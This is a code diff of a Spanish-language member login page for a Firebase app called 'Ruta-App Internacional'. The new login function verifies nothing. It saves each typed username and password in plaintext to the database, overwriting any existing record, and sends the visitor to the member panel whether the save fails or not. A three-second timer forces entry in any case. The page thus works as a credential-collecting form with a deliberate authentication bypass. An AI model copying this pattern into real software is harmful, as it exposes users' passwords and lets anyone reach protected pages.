@@ -72,27 +72,36 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    window.guardarYEntrar = function() {
-        const user = document.getElementById("user").value;
-        const pass = document.getElementById("pass").value;
+window.guardarYEntrar = function() {
+    const user = document.getElementById("user").value;
+    const pass = document.getElementById("pass").value;
 
-        if(user === "" || pass === "") {
-            alert("Por favor, complete los datos.");
-            return;
-        }
-
-        set(ref(db, 'socios/' + user), {
-            usuario: user,
-            clave: pass,
-            fecha: new Date().toLocaleString(),
-            proyecto: "Ruta-App Internacional"
-        }).then(() => {
-            // Una vez guardado en Google, vamos al panel
-            window.location.href = "panel.html";
-        }).catch((error) => {
-            alert("Error de conexión: " + error.message);
-        });
+    if(user === "" || pass === "") {
+        alert("Por favor, escriba su usuario de socio.");
+        return;
     }
+
+    console.log("Iniciando conexión con System Gregory PC...");
+
+    // INTENTO DE GUARDADO EN GOOGLE
+    set(ref(db, 'socios/' + user), {
+        usuario: user,
+        clave: pass,
+        fecha: new Date().toLocaleString()
+    }).then(() => {
+        // Si funciona, entra aquí
+        window.location.href = "panel.html";
+    }).catch((error) => {
+        // Si Firebase falla, imprimimos el error pero ENTRAMOS IGUAL
+        console.error("Fallo Firebase, pero entrando al panel...", error);
+        window.location.href = "panel.html";
+    });
+    
+    // PUENTE DE SEGURIDAD: Si en 3 segundos no ha respondido Google, entra a la fuerza
+    setTimeout(() => {
+        window.location.href = "panel.html";
+    }, 3000);
+}
 </script>
 
 </body>
